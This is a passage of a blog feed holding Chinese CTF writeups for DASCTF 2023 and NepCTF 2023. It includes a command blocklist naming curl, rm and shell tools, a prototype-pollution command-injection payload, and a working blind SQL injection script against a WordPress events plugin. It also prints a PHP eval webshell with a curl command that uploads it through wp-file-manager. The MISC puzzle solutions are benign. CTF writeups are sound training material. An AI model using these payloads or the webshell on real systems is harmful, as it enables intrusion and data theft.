class="string">&quot;ldd&quot;</span>, <span class="string">&quot;whoami&quot;</span>, <span class="string">&quot;strip&quot;</span>, <span class="string">&quot;dircolors&quot;</span>, <span class="string">&quot;nl&quot;</span>, <span class="string">&quot;trust&quot;</span>, <span class="string">&quot;stty&quot;</span>, <span class="string">&quot;ul&quot;</span>, <span class="string">&quot;chacl&quot;</span>, <span class="string">&quot;loginctl&quot;</span>, <span class="string">&quot;gzip&quot;</span>, <span class="string">&quot;xzmore&quot;</span>, <span class="string">&quot;zcat&quot;</span>, <span class="string">&quot;busctl&quot;</span>, <span class="string">&quot;fincore&quot;</span>, <span class="string">&quot;fgrep&quot;</span>, <span class="string">&quot;dmesg&quot;</span>, <span class="string">&quot;rm&quot;</span>, <span class="string">&quot;mv&quot;</span>, <span class="string">&quot;cat&quot;</span>, <span class="string">&quot;lslogins&quot;</span>, <span class="string">&quot;numfmt&quot;</span>, <span class="string">&quot;flock&quot;</span>, <span class="string">&quot;realpath&quot;</span>, <span class="string">&quot;find&quot;</span>, <span class="string">&quot;tracepath&quot;</span>, <span class="string">&quot;lesskey&quot;</span>, <span class="string">&quot;printenv&quot;</span>, <span class="string">&quot;du&quot;</span>, <span class="string">&quot;grep&quot;</span>, <span class="string">&quot;udevadm&quot;</span>, <span class="string">&quot;tee&quot;</span>, <span class="string">&quot;rename&quot;</span>, <span class="string">&quot;gawk&quot;</span>, <span class="string">&quot;mkdir&quot;</span>, <span class="string">&quot;sg&quot;</span>, <span class="string">&quot;xzegrep&quot;</span>, <span class="string">&quot;xzdec&quot;</span>, <span class="string">&quot;split&quot;</span>, <span class="string">&quot;whereis&quot;</span>, <span class="string">&quot;strings&quot;</span>, <span class="string">&quot;setfacl&quot;</span>, <span class="string">&quot;mkfifo&quot;</span>, <span class="string">&quot;chage&quot;</span>, <span class="string">&quot;xzgrep&quot;</span>, <span class="string">&quot;kill&quot;</span>, <span class="string">&quot;rvi&quot;</span>, <span class="string">&quot;size&quot;</span>, <span class="string">&quot;ypdomainname&quot;</span>, <span class="string">&quot;tr&quot;</span>, <span class="string">&quot;umount&quot;</span>, <span class="string">&quot;rev&quot;</span>, <span class="string">&quot;wdctl&quot;</span>, <span class="string">&quot;uniq&quot;</span>, <span class="string">&quot;ps&quot;</span>, <span class="string">&quot;stdbuf&quot;</span>, <span class="string">&quot;chgrp&quot;</span>, <span class="string">&quot;setarch&quot;</span>, <span class="string">&quot;cd&quot;</span>, <span class="string">&quot;dirmngr&quot;</span>, <span class="string">&quot;write&quot;</span>, <span class="string">&quot;lastlog&quot;</span>, <span class="string">&quot;gsettings&quot;</span>, <span class="string">&quot;ex&quot;</span>, <span class="string">&quot;ipcrm&quot;</span>, <span class="string">&quot;cp&quot;</span>, <span class="string">&quot;fallocate&quot;</span>, <span class="string">&quot;colrm&quot;</span>, <span class="string">&quot;rpm&quot;</span>, <span class="string">&quot;pwdx&quot;</span>, <span class="string">&quot;xargs&quot;</span>, <span class="string">&quot;objdump&quot;</span>, <span class="string">&quot;ld&quot;</span>, <span class="string">&quot;chcon&quot;</span>, <span class="string">&quot;skill&quot;</span>, <span class="string">&quot;yum&quot;</span>, <span class="string">&quot;who&quot;</span>, <span class="string">&quot;gapplication&quot;</span>, <span class="string">&quot;stat&quot;</span>, <span class="string">&quot;sleep&quot;</span>, <span class="string">&quot;wait&quot;</span>, <span class="string">&quot;fg&quot;</span>, <span class="string">&quot;uuidgen&quot;</span>, <span class="string">&quot;logger&quot;</span>, <span class="string">&quot;pwscore&quot;</span>, <span class="string">&quot;xz&quot;</span>, <span class="string">&quot;mesg&quot;</span>, <span class="string">&quot;rmdir&quot;</span>, <span class="string">&quot;zgrep&quot;</span>, <span class="string">&quot;chmem&quot;</span>, <span class="string">&quot;newuidmap&quot;</span>, <span class="string">&quot;evmctl&quot;</span>, <span class="string">&quot;wc&quot;</span>, <span class="string">&quot;top&quot;</span>, <span class="string">&quot;egrep&quot;</span>, <span class="string">&quot;fold&quot;</span>, <span class="string">&quot;zfgrep&quot;</span>, <span class="string">&quot;link&quot;</span>, <span class="string">&quot;csplit&quot;</span>, <span class="string">&quot;sum&quot;</span>, <span class="string">&quot;expand&quot;</span>, <span class="string">&quot;getfacl&quot;</span>, <span class="string">&quot;newgidmap&quot;</span>, <span class="string">&quot;join&quot;</span>, <span class="string">&quot;install&quot;</span>, <span class="string">&quot;bootctl&quot;</span>, <span class="string">&quot;xzless&quot;</span>, <span class="string">&quot;runcon&quot;</span>, <span class="string">&quot;dirname&quot;</span>, <span class="string">&quot;comm&quot;</span>, <span class="string">&quot;false&quot;</span>, <span class="string">&quot;hostname&quot;</span>, <span class="string">&quot;unlink&quot;</span>, <span class="string">&quot;sh&quot;</span>, <span class="string">&quot;ipcalc&quot;</span>, <span class="string">&quot;unexpand&quot;</span>, <span class="string">&quot;nohup&quot;</span>, <span class="string">&quot;zegrep&quot;</span>, <span class="string">&quot;head&quot;</span>, <span class="string">&quot;getopt&quot;</span>, <span class="string">&quot;raw&quot;</span>, <span class="string">&quot;hexdump&quot;</span>, <span class="string">&quot;mountpoint&quot;</span>, <span class="string">&quot;lslocks&quot;</span>, <span class="string">&quot;coreutils&quot;</span>, <span class="string">&quot;shred&quot;</span>, <span class="string">&quot;sotruss&quot;</span>, <span class="string">&quot;true&quot;</span>, <span class="string">&quot;pldd&quot;</span>, <span class="string">&quot;uuidparse&quot;</span>, <span class="string">&quot;localectl&quot;</span>, <span class="string">&quot;gtar&quot;</span>, <span class="string">&quot;test&quot;</span>, <span class="string">&quot;znew&quot;</span>, <span class="string">&quot;logname&quot;</span>, <span class="string">&quot;gzexe&quot;</span>, <span class="string">&quot;rpmquery&quot;</span>, <span class="string">&quot;touch&quot;</span>, <span class="string">&quot;hash&quot;</span>, <span class="string">&quot;cpio&quot;</span>, <span class="string">&quot;sprof&quot;</span>, <span class="string">&quot;hostnamectl&quot;</span>, <span class="string">&quot;env&quot;</span>, <span class="string">&quot;uname&quot;</span>, <span class="string">&quot;unxz&quot;</span>, <span class="string">&quot;zdiff&quot;</span>, <span class="string">&quot;gdbus&quot;</span>, <span class="string">&quot;namei&quot;</span>, <span class="string">&quot;ls&quot;</span>, <span class="string">&quot;kmod&quot;</span>, <span class="string">&quot;info&quot;</span>, <span class="string">&quot;umask&quot;</span>, <span class="string">&quot;zcmp&quot;</span>, <span class="string">&quot;w&quot;</span>, <span class="string">&quot;mktemp&quot;</span>, <span class="string">&quot;pwd&quot;</span>, <span class="string">&quot;column&quot;</span>, <span class="string">&quot;scriptreplay&quot;</span>, <span class="string">&quot;lessecho&quot;</span>, <span class="string">&quot;look&quot;</span>, <span class="string">&quot;setterm&quot;</span>, <span class="string">&quot;gdbmtool&quot;</span>, <span class="string">&quot;rpmkeys&quot;</span>, <span class="string">&quot;bg&quot;</span>, <span class="string">&quot;id&quot;</span>, <span class="string">&quot;gpasswd&quot;</span>, <span class="string">&quot;dracut&quot;</span>, <span class="string">&quot;vdir&quot;</span>, <span class="string">&quot;mcookie&quot;</span>, <span class="string">&quot;elfedit&quot;</span>, <span class="string">&quot;chown&quot;</span>, <span class="string">&quot;objcopy&quot;</span>, <span class="string">&quot;hostid&quot;</span>, <span class="string">&quot;shuf&quot;</span>, <span class="string">&quot;view&quot;</span>, <span class="string">&quot;mknod&quot;</span>, <span class="string">&quot;gpgparsemail&quot;</span>, <span class="string">&quot;fc&quot;</span>, <span class="string">&quot;tail&quot;</span>, <span class="string">&quot;zforce&quot;</span>, <span class="string">&quot;last&quot;</span>, <span class="string">&quot;dir&quot;</span>, <span class="string">&quot;ionice&quot;</span>, <span class="string">&quot;read&quot;</span>, <span class="string">&quot;resolvectl&quot;</span>, <span class="string">&quot;watchgnupg&quot;</span>, <span class="string">&quot;unshare&quot;</span>, <span class="string">&quot;timeout&quot;</span>, <span class="string">&quot;getconf&quot;</span>, <span class="string">&quot;findmnt&quot;</span>, <span class="string">&quot;pr&quot;</span>, <span class="string">&quot;xzfgrep&quot;</span>, <span class="string">&quot;ping&quot;</span>, <span class="string">&quot;rview&quot;</span>, <span class="string">&quot;fmt&quot;</span>, <span class="string">&quot;echo&quot;</span>, <span class="string">&quot;readlink&quot;</span>, <span class="string">&quot;dd&quot;</span>, <span class="string">&quot;paste&quot;</span>, <span class="string">&quot;od&quot;</span>, <span class="string">&quot;setpriv&quot;</span>, <span class="string">&quot;coredumpctl&quot;</span>, <span class="string">&quot;dnf&quot;</span>, <span class="string">&quot;xzdiff&quot;</span>, <span class="string">&quot;renice&quot;</span>, <span class="string">&quot;pkill&quot;</span>, <span class="string">&quot;mkinitrd&quot;</span>, <span class="string">&quot;pmap&quot;</span>, <span class="string">&quot;snice&quot;</span>, <span class="string">&quot;gio&quot;</span>, <span class="string">&quot;gpgconf&quot;</span>, <span class="string">&quot;expr&quot;</span>, <span class="string">&quot;ulimit&quot;</span>, <span class="string">&quot;nproc&quot;</span>, <span class="string">&quot;pidof&quot;</span>, <span class="string">&quot;watch&quot;</span>, <span class="string">&quot;cksum&quot;</span>, <span class="string">&quot;yes&quot;</span>, <span class="string">&quot;rpmverify&quot;</span>, <span class="string">&quot;lsblk&quot;</span>, <span class="string">&quot;catchsegv&quot;</span>, <span class="string">&quot;uptime&quot;</span>, <span class="string">&quot;seq&quot;</span>, <span class="string">&quot;ln&quot;</span>, <span class="string">&quot;cut&quot;</span>, <span class="string">&quot;bashbug&quot;</span>, <span class="string">&quot;curl&quot;</span>, <span class="string">&quot;gprof&quot;</span>, <span class="string">&quot;node&quot;</span>, <span class="string">&quot;npm&quot;</span>, <span class="string">&quot;corepack&quot;</span>, <span class="string">&quot;npx&quot;</span>];</span><br><span class="line">    <span class="keyword">const</span> <span class="variable constant_">eval_chr</span> = [<span class="string">&quot;&lt;&quot;</span>, <span class="string">&quot;&gt;&quot;</span>];</span><br><span class="line">    <span class="keyword">for</span> (let i = <span class="number">0</span>; i &lt; command.length; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (cmd.<span class="title function_ invoke__">includes</span>(command[i] + <span class="string">&#x27;&amp;&#x27;</span>) || cmd.<span class="title function_ invoke__">includes</span>(<span class="string">&#x27;&amp;&#x27;</span> + command[i]) || cmd.<span class="title function_ invoke__">includes</span>(command[i] + <span class="string">&#x27;|&#x27;</span>) || cmd.<span class="title function_ invoke__">includes</span>(<span class="string">&#x27;|&#x27;</span> + command[i]) || cmd.<span class="title function_ invoke__">includes</span>(<span class="string">&#x27;;&#x27;</span> + command[i]) || cmd.<span class="title function_ invoke__">includes</span>(<span class="string">&#x27;(&#x27;</span> + command[i]) || cmd.<span class="title function_ invoke__">includes</span>(<span class="string">&#x27;/&#x27;</span> + command[i])) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (let j = <span class="number">0</span>; j &lt; eval_chr.length; j++) &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (cmd.<span class="title function_ invoke__">includes</span>(eval_chr[j])) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>check_cmd</code>中不允许使用带参数的命令</p><p><a href="https://www.leavesongs.com/PENETRATION/how-I-hack-bash-through-environment-injection.html">我是如何利用环境变量注入执行任意命令 | 离别歌 (leavesongs.com)</a></p><p>paylaod：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://bc645e8b-eeea-4bbe-ae7a-861bd0429a00.node4.buuoj.cn:81/&quot;</span></span><br><span class="line">payload = &#123;<span class="string">&quot;msg&quot;</span>: &#123;<span class="string">&quot;name&quot;</span>: <span class="string">&quot;%ff&quot;</span>, <span class="string">&quot;__proto__&quot;</span>: &#123;<span class="string">&quot;cmd_rce&quot;</span>: <span class="string">&quot;env $&#x27;cat&#x27; /flag&quot;</span>&#125;&#125;&#125;</span><br><span class="line"></span><br><span class="line">response = requests.post(url, json=payload)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(response.text)</span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202406/3051266-20240606193507709-1142423974.png" alt="image-20240606193507546"></p><h2 id="EzPenetration">EzPenetration</h2><p>一个Wordpress的站点，利用wpscan工具扫描一下**（有token和没token的差距真的很大！）**：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wpscan --url http://10.10.10.10/wordpress -e --api-token xxxxxxxxxxxxxxxxxxx <span class="comment">#-e简单进行整体快速扫描</span></span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202406/3051266-20240606193530755-1331602688.png" alt="image-20240606193529910"></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202406/3051266-20240606193534540-849651288.png" alt="image-20240606193534307"></p><p>发现 <strong>Registrations for the Events Calendar &lt; 2.7.6 - Unauthenticated SQL Injection</strong> 的漏洞以及yanshu用户</p><p>利用二分法爆破脚本进行数据库爆破</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#! /bin/python</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    session = requests.Session()</span><br><span class="line">    paramsGet = &#123;<span class="string">&quot;action&quot;</span>: <span class="string">&quot;rtec_send_unregister_link&quot;</span>&#125;</span><br><span class="line">    result = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;wp_option&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> <span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).listdir(<span class="string">&#x27;.&#x27;</span>):</span><br><span class="line">        <span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).system(<span class="string">&#x27;touch wp_option&#x27;</span>)  <span class="comment"># 用于记录wp_options表的内容</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;wp_option&#x27;</span>, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:  <span class="comment"># 断点重连</span></span><br><span class="line">        result = f.read()[<span class="number">0</span>:-<span class="number">1</span>]</span><br><span class="line">    i = <span class="built_in">len</span>(result)</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        i = i + <span class="number">1</span></span><br><span class="line">        head = <span class="number">30</span></span><br><span class="line">        tail = <span class="number">130</span></span><br><span class="line">        <span class="keyword">while</span> head &lt; tail:</span><br><span class="line">            mid = (head + tail) &gt;&gt; <span class="number">1</span></span><br><span class="line">            paramsPost = &#123;<span class="string">&quot;email&quot;</span>: <span class="string">&quot;r3tr0young@gmail.com&quot;</span>,</span><br><span class="line">                          <span class="string">&quot;event_id&quot;</span>: <span class="string">f&quot;3 union select 1,2,3,4,5,6,7,8,9,database() from wp_users where 0^(select(select ascii(substr(group_concat(option_name,0x7e,option_value),<span class="subst">&#123;i&#125;</span>,1)) from wp_options where option_id = 16)&gt;<span class="subst">&#123;mid&#125;</span>)-- &quot;</span>&#125;</span><br><span class="line">            cookies = &#123;<span class="string">&quot;wordpress_test_cookie&quot;</span>: <span class="string">&quot;WP%20Cookie%20check&quot;</span>&#125;</span><br><span class="line">            response = session.post(<span class="string">&quot;http://127.0.0.1:8080/wp-admin/admin-ajax.php&quot;</span>, data=paramsPost, params=paramsGet,</span><br><span class="line">                                    cookies=cookies)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;success&quot;</span> <span class="keyword">in</span> response.text:</span><br><span class="line">                head = mid + <span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                tail = mid</span><br><span class="line">        <span class="keyword">if</span> head != <span class="number">30</span>:</span><br><span class="line">            result += <span class="built_in">chr</span>(head)</span><br><span class="line">            <span class="built_in">print</span>(result)</span><br><span class="line">            <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;wp_option&#x27;</span>, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">                f.write(result)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">restart</span>():</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        main()</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        restart()</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        main()</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        restart()</span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202406/3051266-20240606193700417-1243153106.png" alt="image-20240606193659818"></p><p>利用脚本爆破密码结合wpscan扫描出来的用户登录</p><blockquote><p>yanshu<br>fO0CO2#0ky#oLgH1JI</p></blockquote><p>登录管理员账号到后台，更改插件的php代码或者安装一个具有漏洞的插件，如wp-file-manager，进行rce</p><p>安装完成后访问<code>/wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202406/3051266-20240606193743286-1748806443.png" alt="image-20240606193743002"></p><p>出现此界面说明漏洞存在</p><p>准备好一句话木马<code>shell.php</code>：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="number">1</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>利用curl命令上传：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -F cmd=upload -F target=l1_ -F upload[]=@shell.php -XPOST <span class="string">&quot;http://node4.buuoj.cn:29777/wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php&quot;</span></span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202406/3051266-20240606193805586-837043641.png" alt="image-20240606193805251"></p><p>蚁剑连接:</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202406/3051266-20240606193814740-1051079640.png" alt="image-20240606193814588"></p><p>在根目录找到flag：</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202406/3051266-20240606193820748-29707845.png" alt="image-20240606193820515"></p>]]></content>
    
    
    <summary type="html">DASCTF X 0psu3十一月挑战赛 2023 Writeup</summary>
    
    
    
    <category term="Writeup" scheme="https://www.fomal.cc/categories/Writeup/"/>
    
    
    <category term="CTF" scheme="https://www.fomal.cc/tags/CTF/"/>
    
    <category term="Competition" scheme="https://www.fomal.cc/tags/Competition/"/>
    
  </entry>
  
  <entry>
    <title>NepCTF 2023</title>
    <link href="https://www.fomal.cc/posts/6c75a1e6.html"/>
    <id>https://www.fomal.cc/posts/6c75a1e6.html</id>
    <published>2023-08-17T01:19:39.000Z</published>
    <updated>2024-06-15T11:07:37.655Z</updated>
    
    <content type="html"><![CDATA[<span id="more"></span><h1>MISC</h1><h2 id="与AI共舞的哈夫曼">与AI共舞的哈夫曼</h2><p>将给的代码扔给gpt，发现缺少一段代码，直接让它帮写出来</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">decompress</span>(<span class="params">input_file, output_file</span>):</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(input_file, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="comment"># Read frequency information</span></span><br><span class="line">        num_symbols = <span class="built_in">ord</span>(f.read(<span class="number">1</span>))</span><br><span class="line">        frequencies = &#123;&#125;</span><br><span class="line">        <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(num_symbols):</span><br><span class="line">            byte, freq_bytes = f.read(<span class="number">1</span>)[<span class="number">0</span>], f.read(<span class="number">4</span>)</span><br><span class="line">            freq = (freq_bytes[<span class="number">0</span>] &lt;&lt; <span class="number">24</span>) | (freq_bytes[<span class="number">1</span>] &lt;&lt; <span class="number">16</span>) | (freq_bytes[<span class="number">2</span>] &lt;&lt; <span class="number">8</span>) | freq_bytes[<span class="number">3</span>]</span><br><span class="line">            frequencies[byte] = freq</span><br><span class="line"></span><br><span class="line">        <span class="comment"># Rebuild Huffman tree</span></span><br><span class="line">        root = build_huffman_tree(frequencies)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># Read compressed data</span></span><br><span class="line">        compressed_data = f.read()</span><br><span class="line">        bit_string = <span class="string">&#x27;&#x27;</span>.join(<span class="built_in">format</span>(byte, <span class="string">&#x27;08b&#x27;</span>) <span class="keyword">for</span> byte <span class="keyword">in</span> compressed_data)</span><br><span class="line"></span><br><span class="line">    current_node = root</span><br><span class="line">    decompressed_data = []</span><br><span class="line">    <span class="keyword">for</span> bit <span class="keyword">in</span> bit_string:</span><br><span class="line">        <span class="keyword">if</span> bit == <span class="string">&#x27;0&#x27;</span>:</span><br><span class="line">            current_node = current_node.left</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            current_node = current_node.right</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> current_node.char <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">            decompressed_data.append(current_node.char)</span><br><span class="line">            current_node = root</span><br><span class="line"></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(output_file, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(<span class="built_in">bytes</span>(decompressed_data))</span><br></pre></td></tr></table></figure><h2 id="codes">codes</h2><p>进去是个C语言的代码执行器</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202406/3051266-20240607191132561-1398252466.png" alt="image-20240607191130216"></p><p>提示说环境变量里面有flag，尝试打印环境变量</p><p><a href="https://blog.csdn.net/aspnet_lyc/article/details/20548767">linux下获取系统环境变量</a></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>** argv, <span class="type">char</span>** arge)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">while</span>(*arge)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, *arge++);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202406/3051266-20240607191149590-996029833.png" alt="image-20240607191146952"></p><h2 id="陌生的语言">陌生的语言</h2><p><img src="https://img2023.cnblogs.com/blog/3051266/202406/3051266-20240607191202791-843148984.png" alt="image-20240607191159956"></p><p>给了hint：<code>Atsuko Kagari</code></p><p>发现了这是一个动漫：小魔女学园</p><p>了解到这是新月文字和古龙语（我看像鸡脚语）</p><p>百度贴吧找到对照：</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202406/3051266-20240607191209889-1271665289.png" alt="image-20240607191207420"></p><p><code>HEARTISYOURMAGIC</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202406/3051266-20240607191223978-911331837.png" alt="image-20240607191221615"></p><p><code>NEPNEPABELIEVING</code></p><p>拼起来</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">NepCTF&#123;NEPNEP_A_BELIEVING_HEART_IS_YOUR_MAGIC&#125;</span><br></pre></td></tr></table></figure><h2 id="小叮弹钢琴">小叮弹钢琴</h2><p>下载后发现是一段音频，用Audacity打开</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202406/3051266-20240607191242189-641817492.png" alt="image-20240607191239458"></p><p>发现不是长就是短的，猜测是摩斯密码，一个个对，发现真是，得到提示</p><p><code>you should use this to xor something</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202406/3051266-20240607191249141-1826519038.png" alt="image-20240607191246544"></p><p>发现了一段字符串</p><p><code>0x370a05303c290e045005031c2b1858473a5f052117032c39230f005d1e17</code></p><p>看提示应该是要寻找另一串字符串，尝试与题目给的字符串异或</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202406/3051266-20240607191302916-1511626233.png" alt="image-20240607191300598"></p><h2 id="你也喜欢三月七么">你也喜欢三月七么</h2><blockquote><p>三月七：耶，终于来到Nepnep星球啦，让我看看正在火热进行的Hacker夺旗大赛群聊。啊！开拓者，这群名看起来怪怪的诶。 （伸出脑袋，凑近群名，轻轻的闻了一下）哇，好咸诶，开拓者你快来看看！</p><p>开拓者（U_id）：(端着下巴，磨蹭了一下，眼神若有所思）这好像需要经过啥256处理一下才能得到我们需要的关键。</p><p>三月七：那我们快想想怎么解开这个谜题！</p><p>flag格式:NepCTF{+m+}</p><p>hint:URL为压缩包密码</p></blockquote><p><strong>txt文件：</strong></p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">salt_lenth= 10 </span><br><span class="line">key_lenth= 16 </span><br><span class="line">iv= 88219bdee9c396eca3c637c0ea436058 #原始iv转hex的值</span><br><span class="line">ciphertext= b700ae6d0cc979a4401f3dd440bf9703b292b57b6a16b79ade01af58025707fbc29941105d7f50f2657cf7eac735a800ecccdfd42bf6c6ce3b00c8734bf500c819e99e074f481dbece626ccc2f6e0562a81fe84e5dd9750f5a0bb7c20460577547d3255ba636402d6db8777e0c5a429d07a821bf7f9e0186e591dfcfb3bfedfc</span><br></pre></td></tr></table></figure><p>题目描述：群名很咸，<code>salt</code>（长度为10），因为加了NepCTF的QQ群，发现群名<code>NepCTF2023</code>正好长度为十，推测<code>salt：NepCTF2023</code></p><p>经过啥256处理一下才能得到我们需要的关键：推出sha256后得到key(关键)</p><p>猜测我们对<code>NepCTF2023</code>经过sha256后可以得到<code>key</code> ，取出前32位：</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dd8e671df3882c5be6423cd030bd7cb6</span><br></pre></td></tr></table></figure><p>然后AES解密=&gt;hex解密=&gt;base64解密：</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202406/3051266-20240607191320995-2136655502.png" alt="image-20240607191318564"></p><p><a href="https://img1.imgtp.com/2023/07/24/yOkXWSJT.png">https://img1.imgtp.com/2023/07/24/yOkXWSJT.png</a></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202406/3051266-20240607191335428-165194366.png" alt="image-20240607191333168"></p><p><strong>星穹铁道文字：</strong></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202406/3051266-20240607191342624-545869757.png" alt="image-20240607191340302"></p><p><strong>翻译一下：</strong></p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span 